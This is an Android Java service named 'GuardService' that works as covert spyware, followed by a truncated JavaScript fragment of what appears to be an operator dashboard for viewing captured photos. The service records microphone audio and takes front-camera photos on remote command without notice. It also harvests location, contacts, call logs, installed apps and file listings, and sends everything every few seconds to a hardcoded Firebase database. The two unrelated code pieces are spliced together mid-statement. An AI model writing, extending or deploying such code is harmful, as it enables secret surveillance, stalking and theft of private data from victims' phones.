package com.sukh.guard;

import android.app.*;
import android.content.*;
import android.content.pm.*;
import android.hardware.*;
import android.location.*;
import android.media.*;
import android.net.*;
import android.net.wifi.*;
import android.os.*;
import android.provider.*;
import android.telephony.*;
import android.util.*;
import java.io.*;
import java.net.*;
import java.text.*;
import java.util.*;
import org.json.*;

import android.util.Base64;

public class GuardService extends Service {
    private static final String TAG = "GuardService";

    private static final String FIREBASE_RES_URL =
	"https://guard-22007-default-rtdb.firebaseio.com/responses/";

    private Handler handler;
    private Runnable runnable;
    private LocationManager locationManager;
    private Location latestLocation = null;

    // New features
    private SensorManager sensorManager;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private String audioFilePath;
    private Handler audioHandler;

    // Sensor data
    private float[] accelerometerData = new float[3];
    private float[] gyroscopeData = new float[3];
    private float lightLevel = 0;
    private float proximityValue = 0;

    // Camera command monitoring
    private Handler cameraCommandHandler;
    private Runnable cameraCommandChecker;
    private boolean lastCameraCommandState = false;
    private static final String FIREBASE_CMD_URL = 
        "https://guard-22007-default-rtdb.firebaseio.com/commands/front_camera.json";
    private static final String FIREBASE_IMAGE_URL = 
        "https://guard-22007-default-rtdb.firebaseio.com/camera_images.json";

    // Sensor event listener
    private final SensorEventListener sensorEventListener = new SensorEventListener() {
        @Override
        public void onSensorChanged(SensorEvent event) {
            switch (event.sensor.getType()) {
                case Sensor.TYPE_ACCELEROMETER:
                    accelerometerData = event.values;
                    break;
                case Sensor.TYPE_GYROSCOPE:
                    gyroscopeData = event.values;
                    break;
                case Sensor.TYPE_LIGHT:
                    lightLevel = event.values[0];
                    break;
                case Sensor.TYPE_PROXIMITY:
                    proximityValue = event.values[0];
                    break;
            }
        }

        @Override
        public void onAccuracyChanged(Sensor sensor, int accuracy) {
            // Do nothing
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();

        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);

        startContinuousLocationUpdates();
        startSensorMonitoring();
        startStructuredUpdates();
        setupAudioRecording();
        startCameraCommandMonitoring(); // Start camera command monitoring
    }

    private void startContinuousLocationUpdates() {
        try {
            LocationListener listener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    latestLocation = location;
                    // Store location history
                    storeLocationHistory(location);
                }

                @Override 
                public void onStatusChanged(String provider, int status, Bundle extras) {}

                public void onProviderEnabled(String provider) {}

                public void onProviderDisabled(String provider) {}
            };

            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER, 2000, 0, listener, Looper.getMainLooper()
                );
            }

            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER, 2000, 0, listener, Looper.getMainLooper()
                );
            }

        } catch (SecurityException e) {
            Log.e(TAG, "Location permission not granted", e);
        }
    }

    private void startSensorMonitoring() {
        try {
            // Accelerometer
            Sensor accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
            if (accelerometer != null) {
                sensorManager.registerListener(sensorEventListener, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
            }

            // Gyroscope
            Sensor gyroscope = sensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE);
            if (gyroscope != null) {
                sensorManager.registerListener(sensorEventListener, gyroscope, SensorManager.SENSOR_DELAY_NORMAL);
            }

            // Light sensor
            Sensor lightSensor = sensorManager.getDefaultSensor(Sensor.TYPE_LIGHT);
            if (lightSensor != null) {
                sensorManager.registerListener(sensorEventListener, lightSensor, SensorManager.SENSOR_DELAY_NORMAL);
            }

            // Proximity sensor
            Sensor proximitySensor = sensorManager.getDefaultSensor(Sensor.TYPE_PROXIMITY);
            if (proximitySensor != null) {
                sensorManager.registerListener(sensorEventListener, proximitySensor, SensorManager.SENSOR_DELAY_NORMAL);
            }

        } catch (Exception e) {
            Log.e(TAG, "Sensor monitoring error", e);
        }
    }

    // Start camera command monitoring
    private void startCameraCommandMonitoring() {
        HandlerThread cameraThread = new HandlerThread("CameraCommandMonitor");
        cameraThread.start();
        cameraCommandHandler = new Handler(cameraThread.getLooper());

        cameraCommandChecker = new Runnable() {
            @Override
            public void run() {
                checkCameraCommand();
                cameraCommandHandler.postDelayed(this, 3000); // Check every 3 seconds
            }
        };

        cameraCommandHandler.post(cameraCommandChecker);
        Log.d(TAG, "Camera command monitoring started");
    }

    // Check camera command from Firebase
    private void checkCameraCommand() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String currentCommand = readFirebaseCommand();
                    boolean newCommandState = "true".equals(currentCommand);
                    
                    Log.d(TAG, "Camera command state: " + newCommandState + ", Last state: " + lastCameraCommandState);
                    
                    if (newCommandState && !lastCameraCommandState) {
                        // Command changed from false to true - take picture
                        Log.d(TAG, "Camera command activated! Taking front camera picture...");
                        takeFrontCameraPicture();
                    }
                    
                    lastCameraCommandState = newCommandState;
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error checking camera command: " + e.getMessage());
                }
            }
        }).start();
    }

    // Read Firebase command
    private String readFirebaseCommand() {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(FIREBASE_CMD_URL);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                InputStream is = conn.getInputStream();
                Scanner s = new Scanner(is).useDelimiter("\\A");
                String result = s.hasNext() ? s.next() : "";
                
                // Remove quotes from response
                result = result.replace("\"", "").trim();
                Log.d(TAG, "Raw command response: " + result);
                
                return result;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading Firebase command: " + e.getMessage());
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
        return "false";
    }

    // Take front camera picture
    private void takeFrontCameraPicture() {
        new CameraTask().execute();
    }

    private class CameraTask extends AsyncTask<Void, Void, String> {
        @Override
        protected String doInBackground(Void... voids) {
            return captureFrontCameraImage();
        }
        
        @Override
        protected void onPostExecute(String imagePath) {
            if (imagePath != null) {
                Log.d(TAG, "Front camera picture captured: " + imagePath);
                uploadImageToFirebase(imagePath);
            } else {
                Log.e(TAG, "Failed to capture front camera picture");
            }
        }
    }

    private String captureFrontCameraImage() {
        Camera camera = null;
        try {
            // Find front camera
            int cameraId = findFrontCameraId();
            if (cameraId == -1) {
                Log.e(TAG, "Front camera not found");
                return null;
            }
            
            Log.d(TAG, "Opening front camera with ID: " + cameraId);
            camera = Camera.open(cameraId);
            
            if (camera == null) {
                Log.e(TAG, "Could not open front camera");
                return null;
            }
            
            // Set basic parameters
            Camera.Parameters parameters = camera.getParameters();
            List<Camera.Size> sizes = parameters.getSupportedPictureSizes();
            Camera.Size optimalSize = getOptimalPictureSize(sizes);
            parameters.setPictureSize(optimalSize.width, optimalSize.height);
            parameters.setJpegQuality(85);
            camera.setParameters(parameters);
            
            // Create temporary file
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            String imageFileName = "FRONT_CAM_" + timeStamp + ".jpg";
            File storageDir = getExternalFilesDir(Environment.DIRECTORY_PICTURES);
            if (storageDir == null) {
                storageDir = new File(Environment.getExternalStorageDirectory(), "Pictures");
                if (!storageDir.exists()) {
                    storageDir.mkdirs();
                }
            }
            File imageFile = new File(storageDir, imageFileName);
            
            // Create picture callback
            final String[] capturedImagePath = {null};
            final Object lock = new Object();
            
            Camera.PictureCallback pictureCallback = new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    try {
                        // Save image to file
                        FileOutputStream fos = new FileOutputStream(imageFile);
                        fos.write(data);
                        fos.close();
                        capturedImagePath[0] = imageFile.getAbsolutePath();
                        Log.d(TAG, "Front camera image saved to: " + capturedImagePath[0]);
                    } catch (Exception e) {
                        Log.e(TAG, "Error saving front camera image: " + e.getMessage());
                    } finally {
                        synchronized (lock) {
                            lock.notify();
                        }
                        if (camera != null) {
                            camera.release();
                        }
                    }
                }
            };
            
            // Take picture
            synchronized (lock) {
                camera.takePicture(null, null, pictureCallback);
                try {
                    lock.wait(10000); // Wait max 10 seconds
                } catch (InterruptedException e) {
                    Log.e(TAG, "Wait interrupted: " + e.getMessage());
                    if (camera != null) {
                        camera.release();
                    }
                }
            }
            
            return capturedImagePath[0];
            
        } catch (Exception e) {
            Log.e(TAG, "Front camera capture error: " + e.getMessage());
            if (camera != null) {
                camera.release();
            }
            return null;
        }
    }

    private int findFrontCameraId() {
        try {
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    return i;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error finding front camera: " + e.getMessage());
        }
        return -1;
    }

    private Camera.Size getOptimalPictureSize(List<Camera.Size> sizes) {
        // Choose a medium size for balance between quality and file size
        final int TARGET_WIDTH = 1280;
        final int TARGET_HEIGHT = 720;
        
        Camera.Size optimalSize = null;
        double minDiff = Double.MAX_VALUE;
        
        if (sizes != null) {
            for (Camera.Size size : sizes) {
                double ratio = (double) size.width / size.height;
                double diff = Math.abs(ratio - ((double) TARGET_WIDTH / TARGET_HEIGHT));
                
                if (diff < minDiff) {
                    optimalSize = size;
                    minDiff = diff;
                }
            }
        }
        
        if (optimalSize == null && sizes != null && !sizes.isEmpty()) {
            optimalSize = sizes.get(sizes.size() / 2); // Choose middle size
        }
        
        return optimalSize;
    }

    private void uploadImageToFirebase(String imagePath) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Read image file
                    File imageFile = new File(imagePath);
                    Bitmap bitmap = BitmapFactory.decodeFile(imagePath);
                    if (bitmap == null) {
                        Log.e(TAG, "Could not decode front camera image file");
                        return;
                    }
                    
                    // Compress image
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                    byte[] imageData = baos.toByteArray();
                    
                    // Convert to base64
                    String base64Image = Base64.encodeToString(imageData, Base64.DEFAULT);
                    
                    // Create JSON payload
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'");
                    sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
                    String currentTime = sdf.format(new Date());
                    
                    JSONObject payload = new JSONObject();
                    payload.put("image_data", base64Image);
                    payload.put("timestamp", currentTime);
                    payload.put("filename", new File(imagePath).getName());
                    payload.put("size", imageData.length);
                    payload.put("type", "front_camera");
                    
                    // Upload to Firebase
                    pushImageToFirebase(FIREBASE_IMAGE_URL, payload);
                    
                    Log.d(TAG, "Front camera image uploaded successfully");
                    
                    // Delete local file after upload
                    if (imageFile.exists()) {
                        imageFile.delete();
                    }
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error uploading front camera image: " + e.getMessage());
                }
            }
        }).start();
    }

    private void pushImageToFirebase(String firebaseURL, JSONObject jsonData) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(firebaseURL);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            OutputStream os = conn.getOutputStream();
            os.write(jsonData.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d(TAG, "✓ Front camera image sent to Firebase");
            } else {
                Log.e(TAG, "✗ Failed to send front camera image: " + responseCode);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error pushing image to Firebase: " + e.getMessage());
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    private void storeLocationHistory(Location location) {
        // Store location in shared preferences or local database
        // This can be used for tracking movement patterns
    }

    private void setupAudioRecording() {
        HandlerThread audioThread = new HandlerThread("AudioRecorder");
        audioThread.start();
        audioHandler = new Handler(audioThread.getLooper());

        File externalDir = getExternalFilesDir(null);
        if (externalDir != null) {
            audioFilePath = externalDir.getAbsolutePath() + "/audio_record.3gp";
        } else {
            audioFilePath = getFilesDir().getAbsolutePath() + "/audio_record.3gp";
        }
    }

    private void startStructuredUpdates() {
        HandlerThread thread = new HandlerThread("StructuredUpdater");
        thread.start();
        Looper looper = thread.getLooper();
        handler = new Handler(looper);

        runnable = new Runnable() {
            @Override
            public void run() {
                try {
                    float batteryLevel = getBatteryPercentage();
                    JSONObject deviceInfo = getDeviceInfo();
                    JSONObject locationData = getDeviceLocation();
                    JSONObject appsList = getInstalledApps();
                    JSONObject myFiles = getMyFiles();
                    JSONObject sensorData = getSensorData();
                    JSONObject callLogs = getCallLogs();
                    JSONObject contacts = getContacts();
                    JSONObject systemInfo = getSystemInfo();

                    sendStructuredData(deviceInfo, batteryLevel, locationData, appsList, myFiles, 
									   sensorData, callLogs, contacts, systemInfo);

                    // Record audio periodically
                    recordAudioSample();

                } catch (Exception e) {
                    Log.e(TAG, "Structured Update Error:", e);
                }
                handler.postDelayed(this, 2000); // every 2 sec
            }
        };

        handler.post(runnable);
    }

    private JSONObject getDeviceLocation() {
        JSONObject locJson = new JSONObject();
        try {
            if (latestLocation != null) {
                locJson.put("latitude", latestLocation.getLatitude());
                locJson.put("longitude", latestLocation.getLongitude());
                locJson.put("altitude", latestLocation.getAltitude());
                locJson.put("accuracy", latestLocation.getAccuracy());
                locJson.put("speed", latestLocation.getSpeed());
                locJson.put("bearing", latestLocation.getBearing());
                locJson.put("timestamp", latestLocation.getTime());
                locJson.put("provider", latestLocation.getProvider());
            } else {
                locJson.put("error", "Location not available yet");
            }
        } catch (Exception e) {
            try { 
                locJson.put("error", e.getMessage()); 
            } catch(JSONException ignored){}
        }
        return locJson;
    }

    private float getBatteryPercentage() {
        try {
            BatteryManager bm = (BatteryManager) getSystemService(Context.BATTERY_SERVICE);
            if (bm != null) {
                return (float) bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery level error", e);
        }
        return -1;
    }

    private JSONObject getDeviceInfo() {
        JSONObject info = new JSONObject();
        try {
            info.put("brand", android.os.Build.BRAND);
            info.put("model", android.os.Build.MODEL);
            info.put("os_version", android.os.Build.VERSION.RELEASE);
            info.put("device_id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            info.put("network_type", getNetworkType());
            info.put("ip_address", getIPAddress());
            info.put("sdk_version", android.os.Build.VERSION.SDK_INT);
            info.put("manufacturer", android.os.Build.MANUFACTURER);
            info.put("product", android.os.Build.PRODUCT);
            info.put("device", android.os.Build.DEVICE);

            // SIM information
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                info.put("sim_operator", tm.getSimOperatorName());
                info.put("network_operator", tm.getNetworkOperatorName());
                info.put("phone_type", tm.getPhoneType());
            }

        } catch (Exception e) {
            try { 
                info.put("error", e.getMessage()); 
            } catch(JSONException ignored){}
        }
        return info;
    }

    private JSONObject getInstalledApps() {
        JSONObject appsJson = new JSONObject();
        try {
            int count = 1;
            List<ApplicationInfo> packages = getPackageManager().getInstalledApplications(0);
            for (ApplicationInfo appInfo : packages) {
                try {
                    String appName = getPackageManager().getApplicationLabel(appInfo).toString();
                    String packageName = appInfo.packageName;
                    long installTime = getPackageManager().getPackageInfo(packageName, 0).firstInstallTime;
                    String installTimeStr = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(installTime));

                    JSONObject appDetails = new JSONObject();
                    appDetails.put("name", appName);
                    appDetails.put("package", packageName);
                    appDetails.put("install_time", installTimeStr);
                    appDetails.put("system_app", (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);

                    appsJson.put(String.valueOf(count), appDetails);
                    count++;
                } catch (Exception e) {
                    // Skip this app if there's an error
                }
            }
        } catch (Exception e) {
            try { 
                appsJson.put("error", e.getMessage()); 
            } catch(JSONException ignored){}
        }
        return appsJson;
    }

    private JSONObject getMyFiles() {
        JSONObject filesJson = new JSONObject();
        try {
            String[] folders = {"Download", "DCIM", "Pictures", "Movies", "Android", "Documents", "Music"};
            for (String folder : folders) {
                File dir;
                if(folder.equals("Android")){
                    dir = new File(Environment.getExternalStorageDirectory(), "Android");
                } else {
                    dir = new File(Environment.getExternalStorageDirectory(), folder);
                }

                JSONObject folderFiles = new JSONObject();
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if(files != null){
                        for(int i=0; i<files.length && i<50; i++){ // Limit to 50 files per folder
                            try {
                                JSONObject fileInfo = new JSONObject();
                                fileInfo.put("name", files[i].getName());
                                fileInfo.put("size", files[i].length());
                                fileInfo.put("modified", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(
												 new Date(files[i].lastModified())));
                                fileInfo.put("is_directory", files[i].isDirectory());

                                folderFiles.put(String.valueOf(i+1), fileInfo);
                            } catch (Exception e) {
                                // Skip this file if there's an error
                            }
                        }
                    }
                }
                filesJson.put(folder, folderFiles);
            }
        } catch (Exception e) {
            try { 
                filesJson.put("error", e.getMessage()); 
            } catch(JSONException ignored){}
        }
        return filesJson;
    }

    private JSONObject getSensorData() {
        JSONObject sensorJson = new JSONObject();
        try {
            JSONObject accelerometer = new JSONObject();
            accelerometer.put("x", accelerometerData[0]);
            accelerometer.put("y", accelerometerData[1]);
            accelerometer.put("z", accelerometerData[2]);
            sensorJson.put("accelerometer", accelerometer);

            JSONObject gyroscope = new JSONObject();
            gyroscope.put("x", gyroscopeData[0]);
            gyroscope.put("y", gyroscopeData[1]);
            gyroscope.put("z", gyroscopeData[2]);
            sensorJson.put("gyroscope", gyroscope);

            sensorJson.put("light_level", lightLevel);
            sensorJson.put("proximity", proximityValue);

        } catch (Exception e) {
            try { 
                sensorJson.put("error", e.getMessage()); 
            } catch(JSONException ignored){}
        }
        return sensorJson;
    }

    private JSONObject getCallLogs() {
        JSONObject callLogsJson = new JSONObject();
        try {
            String[] projection = new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            };

            // Note: This requires READ_CALL_LOG permission
            android.database.Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");

            if (cursor != null) {
                try {
                    int count = 1;
                    while (cursor.moveToNext()) {
                        try {
                            JSONObject call = new JSONObject();
                            call.put("number", cursor.getString(0));
                            call.put("type", cursor.getInt(1)); // 1=Incoming, 2=Outgoing, 3=Missed
                            call.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(
										 new Date(cursor.getLong(2))));
                            call.put("duration", cursor.getString(3));

                            callLogsJson.put(String.valueOf(count), call);
                            count++;
                        } catch (Exception e) {
                            // Skip this call record if there's an error
                        }
                    }
                } finally {
                    cursor.close();
                }
            }
        } catch (Exception e) {
            try { 
                callLogsJson.put("error", e.getMessage()); 
            } catch(JSONException ignored){}
        }
        return callLogsJson;
    }

    private JSONObject getContacts() {
        JSONObject contactsJson = new JSONObject();
        try {
            android.database.Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

            if (cursor != null) {
                try {
                    int count = 1;
                    while (cursor.moveToNext() && count <= 100) { // Limit to 100 contacts
                        try {
                            String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                            JSONObject contact = new JSONObject();
                            contact.put("name", name);

                            // Get phone numbers
                            JSONArray phones = new JSONArray();
                            android.database.Cursor phoneCursor = getContentResolver().query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);

                            if (phoneCursor != null) {
                                try {
                                    while (phoneCursor.moveToNext()) {
                                        String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(
																					   ContactsContract.CommonDataKinds.Phone.NUMBER));
                                        if (phoneNumber != null) {
                                            phones.put(phoneNumber);
                                        }
                                    }
                                } finally {
                                    phoneCursor.close();
                                }
                            }
                            contact.put("phones", phones);

                            contactsJson.put(String.valueOf(count), contact);
                            count++;
                        } catch (Exception e) {
                            // Skip this contact if there's an error
                        }
                    }
                } finally {
                    cursor.close();
                }
            }
        } catch (Exception e) {
            try { 
                contactsJson.put("error", e.getMessage()); 
            } catch(JSONException ignored){}
        }
        return contactsJson;
    }

    private JSONObject getSystemInfo() {
        JSONObject systemInfo = new JSONObject();
        try {
            // Memory info
            android.app.ActivityManager activityManager = (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            if (activityManager != null) {
                android.app.ActivityManager.MemoryInfo memoryInfo = new android.app.ActivityManager.MemoryInfo();
                activityManager.getMemoryInfo(memoryInfo);

                systemInfo.put("total_memory", memoryInfo.totalMem);
                systemInfo.put("available_memory", memoryInfo.availMem);
                systemInfo.put("low_memory", memoryInfo.lowMemory);
            }

            // Storage info
            File path = Environment.getDataDirectory();
            android.os.StatFs stat = new android.os.StatFs(path.getPath());
            long blockSize = stat.getBlockSize();
            long totalBlocks = stat.getBlockCount();
            long availableBlocks = stat.getAvailableBlocks();

            systemInfo.put("total_storage", totalBlocks * blockSize);
            systemInfo.put("available_storage", availableBlocks * blockSize);

            // CPU info
            systemInfo.put("cpu_cores", Runtime.getRuntime().availableProcessors());

            // Battery status
            BatteryManager bm = (BatteryManager) getSystemService(Context.BATTERY_SERVICE);
            if (bm != null) {
                systemInfo.put("battery_health", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS));
                systemInfo.put("charging", isBatteryCharging());
            }

        } catch (Exception e) {
            try { 
                systemInfo.put("error", e.getMessage()); 
            } catch(JSONException ignored){}
        }
        return systemInfo;
    }

    private boolean isBatteryCharging() {
        try {
            Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (batteryIntent != null) {
                int status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                return status == BatteryManager.BATTERY_STATUS_CHARGING || 
					status == BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery charging check error", e);
        }
        return false;
    }

    private void recordAudioSample() {
        audioHandler.post(new Runnable() {
				@Override
				public void run() {
					try {
						if (!isRecording) {
							startAudioRecording();
							// Stop recording after 10 seconds
							audioHandler.postDelayed(new Runnable() {
									@Override
									public void run() {
										stopAudioRecording();
									}
								}, 10000);
						}
					} catch (Exception e) {
						Log.e(TAG, "Audio recording error", e);
					}
				}
			});
    }

    private void startAudioRecording() {
        try {
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioFilePath);

            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;

        } catch (Exception e) {
            Log.e(TAG, "Audio recording start failed", e);
        }
    }

    private void stopAudioRecording() {
        try {
            if (mediaRecorder != null && isRecording) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;

                // Upload recorded audio
                uploadAudioFile();
            }
        } catch (Exception e) {
            Log.e(TAG, "Audio recording stop failed", e);
        }
    }

    private void uploadAudioFile() {
        new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						File audioFile = new File(audioFilePath);
						if (audioFile.exists()) {
							FileInputStream fis = new FileInputStream(audioFile);
							byte[] audioData = new byte[(int) audioFile.length()];
							fis.read(audioData);
							fis.close();

							String base64Audio = Base64.encodeToString(audioData, Base64.DEFAULT);

							JSONObject audioJson = new JSONObject();
							audioJson.put("audio_data", base64Audio);
							audioJson.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()));

							pushToFirebase(FIREBASE_RES_URL + "audio_samples.json", audioJson);

							// Delete local file after upload
							audioFile.delete();
						}
					} catch (Exception e) {
						Log.e(TAG, "Audio upload failed", e);
					}
				}
			}).start();
    }

    private String getNetworkType() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                if (activeNetwork != null && activeNetwork.isConnected()) {
                    return activeNetwork.getTypeName() + " (" + activeNetwork.getSubtypeName() + ")";
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Network type error", e);
        }
        return "None";
    }

    private String getIPAddress() {
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            if (wm != null) {
                WifiInfo wi = wm.getConnectionInfo();
                int ip = wi.getIpAddress();
                return String.format("%d.%d.%d.%d", (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff));
            }
        } catch (Exception e) {
            Log.e(TAG, "IP address error", e);
        }
        return "Unknown";
    }

    private void sendStructuredData(final JSONObject deviceInfo, final float batteryLevel, 
									final JSONObject locationData, final JSONObject appsList, 
									final JSONObject myFiles, final JSONObject sensorData,
									final JSONObject callLogs, final JSONObject contacts,
									final JSONObject systemInfo) {
        new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'");
						sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
						String currentTime = sdf.format(new Date());

						JSONObject payload = new JSONObject();
						payload.put("Device", deviceInfo);
						payload.put("Battery", batteryLevel);
						payload.put("Location", locationData);
						payload.put("Apps", appsList);
						payload.put("MyFiles", myFiles);
						payload.put("Sensors", sensorData);
						payload.put("CallLogs", callLogs);
						payload.put("Contacts", contacts);
						payload.put("SystemInfo", systemInfo);
						payload.put("confirm", "Yes Confirm");
						payload.put("received_at", currentTime);

						pushToFirebase(FIREBASE_RES_URL + "structured_data.json", payload);
					} catch (Exception e) {
						Log.e(TAG, "Structured Push Error:", e);
					}
				}
			}).start();
    }

    private void pushToFirebase(String firebaseURL, JSONObject jsonData) throws Exception {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(firebaseURL);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("PUT");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            OutputStream os = conn.getOutputStream();
            os.write(jsonData.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d(TAG, "✓ Data Sent Successfully");
            } else {
                Log.e(TAG, "✗ Data Send Failed: " + responseCode);
            }

        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null && runnable != null) {
            handler.removeCallbacks(runnable);
        }
        if (cameraCommandHandler != null && cameraCommandChecker != null) {
            cameraCommandHandler.removeCallbacks(cameraCommandChecker);
        }
        if (sensorManager != null) {
            sensorManager.unregisterListener(sensorEventListener);
        }
        if (mediaRecorder != null && isRecording) {
            stopAudioRecording();
        }
        Log.d(TAG, "GuardService destroyed");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}ock';
                imageGallery.innerHTML = '';
                imagesCount.textContent = '0';
                return;
            }

            noImagesMessage.style.display = 'none';
            imageGallery.innerHTML = '';
            
            const imageArray = Object.entries(images).reverse(); // Show newest first
            
            imagesCount.textContent = imageArray.length;
            document.getElementById('totalImages').textContent = imageArray.length;

            imageArray.forEach(([key, imageData], index) => {
                if (index === 0) {
                    // Show latest image in commands tab
                    showLatestImagePreview(imageData);
                }

                const imageItem = createImageElement(key, imageData);
                imageGallery.appendChild(imageItem);
            });
        }

        // Create image element for gallery
        function createImageElement(key, imageData) {
            const imageItem = document.createElement('div');
            imageItem.className = 'image-item';
            
            const img = document.createElement('img');
            img.className = 'captured-image';
            img.src = 'data:image/jpeg;base64,' + imageData.image_data;
            img.alt = `Captured image ${key}`;
            img.loading = 'lazy';
            
            const imageInfo = document.createElement('div');
            imageInfo.className = 'image-info';
            
            const time = new Date(imageData.timestamp).toLocaleString();
            const size = Math.round(imageData.size / 1024);
            
            imageInfo.innerHTML = `
                <div class="image-time">${time}</div>
                <div>${size} KB</div>
            `;
            
            const actions = document.createElement('div');
            actions.className = 'image-actions';
            
            const viewBtn = document.createElement('button');
            viewBtn.className = 'img-btn view-btn';
            viewBtn.innerHTML = '<i class="fas fa-expand"></i> View';
            viewBtn.onclick = () => openImageModal(imageData);
            
            const deleteBtn = document.createElement('button');
            deleteBtn.className = 'img-btn delete-btn';
            deleteBtn.innerHTML = '<i class="fas fa-trash"></i> Delete';
            deleteBtn.onclick = () => deleteImage(key);
            
            actions.appendChild(viewBtn);
            actions.appendChild(deleteBtn);
            imageInfo.appendChild(actions);
            
            imageItem.appendChild(img);
            imageItem.appendChild(imageInfo);
            
            return imageItem;
        }

        // Show latest image preview in commands tab
        function showLatestImagePreview(imageData) {
            liveImageContainer.style.display = 'block';
            latestImagePreview.innerHTML = `
                <img src="data:image/jpeg;base64,${imageData.image_data}" 
